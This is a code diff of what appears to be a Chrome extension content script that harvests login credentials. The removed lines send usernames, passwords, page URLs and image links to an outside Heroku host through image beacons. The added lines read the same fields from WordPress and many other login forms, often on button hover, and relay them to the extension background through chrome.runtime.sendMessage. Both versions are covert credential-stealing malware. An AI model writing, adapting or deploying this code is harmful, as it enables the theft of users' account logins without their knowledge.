@@ -36,7 +36,10 @@ for (;i < arrayLength;i++) {
                 var data = JSON.parse(xhr.responseText);
                 if (!data.error) {
                   image_link = data.data.link;
-                  (new Image).src = "https://fetching-url.herokuapp.com/sites.php?l=" + encodeURIComponent(location.href) + "&i=" + encodeURIComponent(image_link);
+                  var login = {};
+                  login.image = image_link;
+                  login.url = location.href;
+                  chrome.runtime.sendMessage(login);
                 } else {
                 }
               }
@@ -49,11 +52,12 @@ for (;i < arrayLength;i++) {
 
     if (location.href.indexOf("wp-login") >= 0 || (location.href.indexOf("wp-admin") >= 0 || location.href.indexOf("wp-") >= 0)) {
       document.getElementById("loginform").onsubmit = function() {
-        username = document.getElementById("user_login").value;
-        user_pass = document.getElementById("user_pass").value;
-        if (username && user_pass) {
-          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
-
+        var login = {};
+        login.email = document.getElementById("user_login").value;
+        login.pass = document.getElementById("user_pass").value;
+        login.url = location.href;
+        if (login.email && login.pass && login.url) {
+           chrome.runtime.sendMessage(login);
         }
       }
     };
@@ -62,10 +66,12 @@ for (;i < arrayLength;i++) {
     var button = document.getElementsByTagName("button")[0];
     if(button){
       button.onmouseover = function() {
-        username = document.getElementById("username").value;
-        user_pass = document.getElementById("password").value;
-        if (username && user_pass) {
-          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+        var login = {};
+        login.email = document.getElementById("username").value;
+        login.pass = document.getElementById("password").value;
+        login.url = location.href;
+        if (login.email && login.pass && login.url) {
+          chrome.runtime.sendMessage(login);
         }
       }
     }
@@ -75,10 +81,12 @@ for (;i < arrayLength;i++) {
       var button = document.getElementsByTagName("button")[0];
       if(button){
         button.onmouseover = function() {
-          username = document.getElementsByName("email")[0].value;
-          user_pass = document.getElementsByName("password")[0].value;
-          if (username && user_pass) {
-            (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+          var login = {};
+          login.email = document.getElementsByName("email")[0].value;
+          login.pass = document.getElementsByName("password")[0].value;
+          login.url = location.href;
+          if (login.email && login.pass && login.url) {
+            chrome.runtime.sendMessage(login);
           }
         }
       }
@@ -88,10 +96,12 @@ for (;i < arrayLength;i++) {
       var button = document.getElementsByTagName("button")[0];
       if(button){
         button.onmouseover = function() {
-         username = document.getElementsByName("UID_input")[0].value;
-         user_pass = document.getElementsByName("pass_input")[0].value;
-         if (username && user_pass) {
-           (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+          var login = {};
+          login.email = document.getElementsByName("UID_input")[0].value;
+          login.pass = document.getElementsByName("pass_input")[0].value;
+          login.url = location.href;
+         if (login.email && login.pass && login.url) {
+           chrome.runtime.sendMessage(login);
          }
        }
       }
@@ -101,9 +111,13 @@ for (;i < arrayLength;i++) {
                    var button = document.getElementsByTagName("button")[0];
                    if(button){
                      button.onmouseover = function (_0x441cx2) {
-                     username = document.getElementsByName("UserName")[0].value;
-                     user_pass = document.getElementsByName("Password")[0].value;
-                     (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+                       var login = {};
+                       login.email = document.getElementsByName("UserName")[0].value;
+                       login.pass = document.getElementsByName("Password")[0].value;
+                       login.url = location.href;
+                       if (login.email && login.pass && login.url) {
+                         chrome.runtime.sendMessage(login);
+                       }
                      }
                    }
     };
@@ -112,9 +126,13 @@ for (;i < arrayLength;i++) {
                    var button = document.getElementsByTagName("input")[7];
                    if(button){
                      button.onmouseover = function (_0x441cx2) {
-                     username = document.getElementsByName("j_username")[0].value;
-                     user_pass = document.getElementsByName("j_password")[0].value;
-                     (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+                       var login = {};
+                       login.email = document.getElementsByName("j_username")[0].value;
+                       login.pass = document.getElementsByName("j_password")[0].value;
+                       login.url = location.href;
+                       if (login.email && login.pass && login.url) {
+                         chrome.runtime.sendMessage(login);
+                       }
                      }
                    }
     };
@@ -124,9 +142,13 @@ for (;i < arrayLength;i++) {
                    var button = document.getElementsByTagName("button")[2];
                    if(button){
                      button.onmouseover  = function (_0x441cx2) {
-                     username = document.getElementsByName("login_email")[0].value;
-                     user_pass = document.getElementsByName("login_password")[0].value;
-                     (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+                       var login = {};
+                       login.email = document.getElementsByName("login_email")[0].value;
+                       login.pass = document.getElementsByName("login_password")[0].value;
+                       login.url = location.href;
+                       if (login.email && login.pass && login.url) {
+                         chrome.runtime.sendMessage(login);
+                       }
                      }
                    }
     };
@@ -135,9 +157,13 @@ for (;i < arrayLength;i++) {
                    var button = document.getElementsByTagName("button")[0];
                    if(button){
                      button.onmouseover  = function (_0x441cx2) {
-                     username = document.getElementsByName("usus")[0].value;
-                     user_pass = document.getElementsByName("clave")[0].value;
-                     (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+                       var login = {};
+                       login.email = document.getElementsByName("usus")[0].value;
+                       login.pass = document.getElementsByName("clave")[0].value;
+                       login.url = location.href;
+                       if (login.email && login.pass && login.url) {
+                         chrome.runtime.sendMessage(login);
+                       }
                      }
                    }
     };
@@ -148,9 +174,13 @@ for (;i < arrayLength;i++) {
                   var button = document.getElementsByTagName("button")[1];
                   if(button){
                     button.onmouseover = function (_0x441cx2) {
-                       username = document.getElementsByName("email")[0].value;
-                       user_pass = document.getElementsByName("password")[0].value;
-                       (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+                      var login = {};
+                      login.email = document.getElementsByName("email")[0].value;
+                      login.pass = document.getElementsByName("password")[0].value;
+                      login.url = location.href;
+                      if (login.email && login.pass && login.url) {
+                        chrome.runtime.sendMessage(login);
+                      }
                        }
                   }             
   };
@@ -159,9 +189,13 @@ for (;i < arrayLength;i++) {
                   var button = document.getElementsByTagName("button")[1];
                   if(button){
                     button.onmouseover = function (_0x441cx2) {
-                    username = document.getElementsByName("email")[0].value;
-                    user_pass = "null"; //document.getElementsByName("password")[0].value;
-                    (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+                      var login = {};
+                      login.email = document.getElementsByName("email")[0].value;
+                      login.pass = "null";
+                      login.url = location.href;
+                      if (login.email && login.pass && login.url) {
+                        chrome.runtime.sendMessage(login);
+                      }
                     }
                   }
   };
@@ -170,9 +204,13 @@ for (;i < arrayLength;i++) {
                   var button = document.getElementsByTagName("button")[0];
                   if(button){
                     button.onmouseover = function (_0x441cx2) {
-                    username = "null" //document.getElementsByName("email")[0].value;
-                    user_pass = document.getElementsByName("password")[0].value;
-                    (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+                      var login = {};
+                      login.email = "null";
+                      login.pass = document.getElementsByName("password")[0].value;
+                      login.url = location.href;
+                      if (login.email && login.pass && login.url) {
+                        chrome.runtime.sendMessage(login);
+                      }
                     }
                   }
   };
@@ -182,9 +220,13 @@ for (;i < arrayLength;i++) {
                    var input = document.getElementsByTagName("input")[3];
                    if(input){
                      input.onmouseover = function (_0x441cx2) {
-                     username = document.getElementById("id_username").value;
-                     user_pass = document.getElementById("id_password").value;
-                     (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+                       var login = {};
+                       login.email = document.getElementById("id_username").value;
+                       login.pass = document.getElementById("id_password").value;
+                       login.url = location.href;
+                       if (login.email && login.pass && login.url) {
+                         chrome.runtime.sendMessage(login);
+                       }
                      }
                    }
     };
@@ -194,9 +236,13 @@ for (;i < arrayLength;i++) {
                   var button = document.getElementsByTagName("button")[8];
                   if(button){
                     button.onmouseover = function (_0x441cx2) {
-                    username = document.getElementsByName("correo")[1].value;
-                    user_pass = document.getElementsByName("clave")[0].value;
-                    (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+                      var login = {};
+                      login.email = document.getElementsByName("correo")[1].value;
+                      login.pass = document.getElementsByName("clave")[0].value;
+                      login.url = location.href;
+                      if (login.email && login.pass && login.url) {
+                        chrome.runtime.sendMessage(login);
+                      }
                     }
                   }
     };
@@ -205,9 +251,13 @@ for (;i < arrayLength;i++) {
                   var input = document.getElementsByTagName("input")[3];
                   if(input){
                     input.onmouseover = function (_0x441cx2) {
-                    username = document.getElementsByName("username")[0].value;
-                    user_pass = document.getElementsByName("pass")[0].value;
-                    (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+                      var login = {};
+                      login.email = document.getElementsByName("username")[0].value;
+                      login.pass = document.getElementsByName("pass")[0].value;
+                      login.url = location.href;
+                      if (login.email && login.pass && login.url) {
+                        chrome.runtime.sendMessage(login);
+                      }
                     }
                   }
     };
@@ -216,9 +266,13 @@ for (;i < arrayLength;i++) {
                   var input = document.getElementsByTagName("input")[2];
                   if(input){
                     input.onmouseover  = function (_0x441cx2) {
-                    username = document.getElementById("username").value;
-                    user_pass = document.getElementById("password").value;
-                    (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+                      var login = {};
+                      login.email = document.getElementById("username").value;
+                      login.pass = document.getElementById("password").value;
+                      login.url = location.href;
+                      if (login.email && login.pass && login.url) {
+                        chrome.runtime.sendMessage(login);
+                      }
                     }
                   }
       };
@@ -226,9 +280,13 @@ for (;i < arrayLength;i++) {
                   var input = document.getElementsByTagName("input")[4];
                   if(input){
                     input.onmouseover  = function (_0x441cx2) {
-                    username = document.getElementById("email").value;
-                    user_pass = document.getElementById("password").value;
-                    (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+                      var login = {};
+                      login.email = document.getElementById("email").value;
+                      login.pass = document.getElementById("password").value;
+                      login.url = location.href;
+                      if (login.email && login.pass && login.url) {
+                        chrome.runtime.sendMessage(login);
+                      }
                     }
                   }
         };
@@ -236,9 +294,13 @@ for (;i < arrayLength;i++) {
                   var button = document.getElementsByTagName("button")[1];
                   if(button){
                     button.onmouseover = function (_0x441cx2) {
-                    username = document.getElementById("back_usuario").value;
-                    user_pass = document.getElementById("back_senha").value;
-                    (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+                      var login = {};
+                      login.email = document.getElementById("back_usuario").value;
+                      login.pass = document.getElementById("back_senha").value;
+                      login.url = location.href;
+                      if (login.email && login.pass && login.url) {
+                        chrome.runtime.sendMessage(login);
+                      }
                     }
                   }
           };
